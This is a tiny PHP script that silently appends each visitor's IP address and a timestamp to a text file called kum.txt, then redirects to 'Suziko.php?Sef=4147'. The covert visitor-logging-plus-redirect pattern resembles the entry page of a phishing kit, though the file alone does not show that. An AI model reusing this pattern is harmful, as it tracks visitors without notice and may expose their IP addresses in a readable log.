<?php

header("location:Suziko.php?Sef=4147");
$ip = getenv("REMOTE_ADDR");
$file = fopen("kum.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
<META HTTP-EQUIV="Refresh" CONTENT="0;URL=Suziko.php?Sef=4147"> 